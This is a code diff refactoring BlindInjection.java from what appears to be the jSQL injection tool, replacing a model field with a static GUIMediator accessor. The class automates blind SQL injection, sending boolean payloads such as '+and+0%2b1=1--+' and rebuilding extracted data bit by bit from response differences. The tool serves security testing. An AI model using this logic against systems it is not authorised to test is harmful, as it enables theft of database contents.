@@ -24,10 +24,10 @@ import java.util.concurrent.TimeUnit;
 
 import com.jsql.exception.PreparationException;
 import com.jsql.exception.StoppableException;
-import com.jsql.model.InjectionModel;
 import com.jsql.model.Interruptable;
 import com.jsql.model.Stoppable;
 import com.jsql.model.bean.Request;
+import com.jsql.view.GUIMediator;
 
 /**
  * This module runs injection with method blind, which is defined as the following:
@@ -49,11 +49,7 @@ public class BlindInjection {
      */
     public List<diff_match_patch.Diff> constantFalseMark;
 
-    // Reference to the model for proxy setting, stop preparation, communication with the view, HTTP requests
-    private InjectionModel model;
-
-    public BlindInjection(InjectionModel newModel){
-        model = newModel;
+    public BlindInjection(){
 
         // Call the SQL request which must be TRUE (usually ?id=1)
         blankTrueMark = callUrl("");
@@ -65,7 +61,7 @@ public class BlindInjection {
         String[] trueTest = {"true=true","false=false","true%21=false","1=1","2=2","1%21=2"};
 
         // Check if the user wants to stop the preparation
-        if(model.stopFlag)return;
+        if(GUIMediator.model().stopFlag)return;
 
         /**
          *  Parallelize the call to the FALSE statements, it will use inject() from the model
@@ -80,7 +76,7 @@ public class BlindInjection {
         try {
             listFalseMark = executorFalseMark.invokeAll(listCallableFalse);
         } catch (InterruptedException e) {
-            this.model.sendDebugMessage(e);
+            GUIMediator.model().sendDebugMessage(e);
             return;
         }
         executorFalseMark.shutdown();
@@ -90,20 +86,20 @@ public class BlindInjection {
          * Allow the user to stop the loop
          */
         try {
-            constantFalseMark = ((BlindCallable) listFalseMark.get(0).get()).opcodes;
+            constantFalseMark = listFalseMark.get(0).get().opcodes;
             //            System.out.println(">>>false "+constantFalseMark);
             for(Future<BlindCallable> falseMark: listFalseMark){
-                if(model.stopFlag)return;
-                constantFalseMark.retainAll(((BlindCallable) falseMark.get()).opcodes);
+                if(GUIMediator.model().stopFlag)return;
+                constantFalseMark.retainAll(falseMark.get().opcodes);
             }
         } catch (InterruptedException e) {
-            this.model.sendDebugMessage(e);
+            GUIMediator.model().sendDebugMessage(e);
         } catch (ExecutionException e) {
-            this.model.sendDebugMessage(e);
+            GUIMediator.model().sendDebugMessage(e);
         }
         //        System.out.println(">>>false-s "+constantFalseMark);
 
-        if(model.stopFlag)return;
+        if(GUIMediator.model().stopFlag)return;
 
         /**
          *  Parallelize the call to the TRUE statements, it will use inject() from the model
@@ -118,7 +114,7 @@ public class BlindInjection {
         try {
             listTrueMark = executorTrueMark.invokeAll(listCallableTrue);
         } catch (InterruptedException e) {
-            this.model.sendDebugMessage(e);
+            GUIMediator.model().sendDebugMessage(e);
             return;
         }
         executorTrueMark.shutdown();
@@ -131,13 +127,13 @@ public class BlindInjection {
         try {
             //            System.out.println(">>>true "+constantTrueMark);
             for(Future<BlindCallable> trueMark: listTrueMark){
-                if(model.stopFlag)return;
-                constantFalseMark.removeAll(((BlindCallable) trueMark.get()).opcodes);
+                if(GUIMediator.model().stopFlag)return;
+                constantFalseMark.removeAll(trueMark.get().opcodes);
             }
         } catch (InterruptedException e) {
-            this.model.sendDebugMessage(e);
+            GUIMediator.model().sendDebugMessage(e);
         } catch (ExecutionException e) {
-            this.model.sendDebugMessage(e);
+            GUIMediator.model().sendDebugMessage(e);
         }
 
         //        System.out.println(">>> "+constantFalseMark);
@@ -183,8 +179,7 @@ public class BlindInjection {
                 try {
                     success = taskExecutor.awaitTermination(0, TimeUnit.SECONDS);
                 } catch (InterruptedException e) {
-                    this.model.sendDebugMessage(e);
-                    model.sendErrorMessage("Current thread was interrupted while waiting.");
+                    GUIMediator.model().sendDebugMessage(e);
                 }
                 if (!success) {
                     // awaitTermination timed out, interrupt everyone
@@ -236,15 +231,15 @@ public class BlindInjection {
                         Request interaction = new Request();
                         interaction.setMessage("MessageBinary");
                         interaction.setParameters("\t"+new String(e)+"="+str);
-                        this.model.interact(interaction);
-                    }catch(NumberFormatException err){
-                        this.model.sendErrorMessage("Error during blind conversion.");
+                        GUIMediator.model().interact(interaction);
+                    }catch(NumberFormatException err){ // byte string not fully constructed : 0x1x010x
+                        /* Ignore */
                     }
                 }
             } catch (InterruptedException e) {
-                this.model.sendDebugMessage(e);
+                GUIMediator.model().sendDebugMessage(e);
             } catch (ExecutionException e) {
-                this.model.sendDebugMessage(e);
+                GUIMediator.model().sendDebugMessage(e);
             }
         }
 
@@ -253,7 +248,7 @@ public class BlindInjection {
             taskExecutor.shutdown();
             taskExecutor.awaitTermination(15, TimeUnit.SECONDS);
         } catch (InterruptedException e) {
-            this.model.sendDebugMessage(e);
+            GUIMediator.model().sendDebugMessage(e);
         }
 
         // Build the complete final string from array of bits
@@ -331,7 +326,7 @@ public class BlindInjection {
 
     // Run a HTTP call via the model
     public String callUrl(String urlString){
-        return model.inject(model.insertionCharacter + urlString);
+        return GUIMediator.model().inject(GUIMediator.model().insertionCharacter + urlString);
     }
 
     /**
@@ -340,14 +335,14 @@ public class BlindInjection {
      * @throws PreparationException
      */
     public boolean isBlindInjectable() throws PreparationException{
-        if(model.stopFlag)
+        if(GUIMediator.model().stopFlag)
             throw new PreparationException();
 
         BlindCallable blindTest = new BlindCallable("+and+0%2b1=1--+");
         try {
             blindTest.call();
         } catch (Exception e) {
-            this.model.sendDebugMessage(e);
+            GUIMediator.model().sendDebugMessage(e);
         }
 
         return constantFalseMark != null && blindTest.isTrue() && constantFalseMark.size() > 0;
